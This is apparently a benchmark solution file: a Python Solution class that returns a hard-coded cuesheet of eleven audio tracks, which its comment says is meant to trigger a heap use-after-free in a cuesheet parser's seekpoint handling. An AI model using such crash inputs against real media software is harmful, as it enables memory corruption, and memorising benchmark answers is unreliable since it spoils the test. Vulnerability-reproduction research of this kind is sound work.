import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a cuesheet that triggers heap use-after-free
        # when appending seekpoints causing realloc
        poc = b"""FILE "test.wav" WAVE
TRACK 01 AUDIO
  INDEX 01 00:00:00
TRACK 02 AUDIO
  INDEX 01 00:00:00
TRACK 03 AUDIO
  INDEX 01 00:00:00
TRACK 04 AUDIO
  INDEX 01 00:00:00
TRACK 05 AUDIO
  INDEX 01 00:00:00
TRACK 06 AUDIO
  INDEX 01 00:00:00
TRACK 07 AUDIO
  INDEX 01 00:00:00
TRACK 08 AUDIO
  INDEX 01 00:00:00
TRACK 09 AUDIO
  INDEX 01 00:00:00
TRACK 10 AUDIO
  INDEX 01 00:00:00
TRACK 11 AUDIO
  INDEX 01 00:00:00"""
        return poc
